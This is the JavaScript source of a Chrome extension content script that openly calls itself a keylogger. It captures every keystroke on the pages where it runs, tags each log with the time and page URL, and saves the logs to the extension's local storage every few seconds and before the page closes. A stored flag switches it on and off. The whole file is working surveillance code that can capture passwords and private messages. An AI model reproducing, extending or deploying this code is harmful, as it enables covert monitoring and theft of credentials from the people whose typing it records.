console.log("KeyLogger Running");
var enabled = true;

var keyConversations = { 192: "`", 49: "1", 50: "2",51: "3", 52: "4", 53: "5",54: "6", 55: "7",
						56: "8", 57: "9", 48: "0", 189: "-", 187: "+", 8:" BS ",
						9: " TAB ", 81: "q", 87: "w", 69: "e", 82: "r", 84: "t", 89:"y",
						85:"u", 73:"i", 79:"o", 80:"p", 219:"[",221:"]", 220: "\"",
						20:"CapsLock",65:"a", 83:"s", 68:"d",70:"f", 71:"g",72:"h",
						74:"j", 75:"k", 76:"l", 186: ";", 222:"'", 13:" Enter ", 
						16:" SHIFT ", 90:"z", 88:"x", 67:"c", 86:"v", 66:"b", 78: "n",
						77:"m", 188:",", 190:".", 191:"/", 17:" CTRL ", 18: " alt ", 32:" SP ",
						37:" LEFT ", 38:" UP ",39:" RIGHT ", 40:" DOWN ",
						36:" HOME ", 35:" END ",45:" INS ", 46:" DE L", 33:" PAGUP ", 34:" PAGDOWN "};

var fullTimeStamp;
var keyLog;

//Makes a new TimeStamp and clears the log----------------------//
function getTimeStamp(){
	var dateObject = new Date();
	var hours = dateObject.getHours();
	var minutes = dateObject.getMinutes();
	//var seconds = dateObject.getSeconds();
	var day = dateObject.getDate();
	var month = dateObject.getMonth();
	var year = dateObject.getFullYear();
	var url = document.URL;
	fullTimeStamp = hours + ":" + minutes + " " + month +"/" + day + "/" + year + ": " + url ;
	keyLog = {};
	keyLog[fullTimeStamp] = "";
}

getTimeStamp();
var saving = false;

//Tracks every keyStroke
document.onkeydown = function(event){
	//console.log(keyLog[fullTimeStamp].length);
	keyLog[fullTimeStamp] += keyConversations[event.keyCode];
	//console.log(fullTimeStamp + " " + keyLog[fullTimeStamp]);
};

//-----Calls Save function every 3 seconds----------------------------///
window.setInterval(saveToStorage, 3000);

//----------------save function to store keylogs------------------------//
function saveToStorage(){
	var length = keyLog[fullTimeStamp].length;
	if(length != 0 && saving != true && enabled == true){
		saving = true;
		//console.log("data was saved");
		chrome.storage.local.get(fullTimeStamp, function(storage){
		//console.log("Saved Log" );
		//console.log(storage);
		if(storage[fullTimeStamp] != undefined){
			storage[fullTimeStamp] += keyLog[fullTimeStamp];
			chrome.storage.local.set(storage, function(){
				saving = false;
			});
		}else{
			chrome.storage.local.set(keyLog, function(){
				saving = false;
			});
		}
		getTimeStamp();
		});
	}
}

//------------Saves keyLog before window closes-------------------/
window.onbeforeunload = function(){
	saveToStorage();
}


//------------------Turns Keylogger ON and OFF-------------------//
chrome.storage.onChanged.addListener(function(object, area){
	var monitorStatus = object['monitor'];
	if(monitorStatus !=undefined){
		var status =  monitorStatus['newValue'];
		if(status == 'active'){
			//console.log("enabled");
			enabled = true;
		}else if(status == "inactive"){
			//console.log("disenabled");
			enabled = false;
		}
	}
});


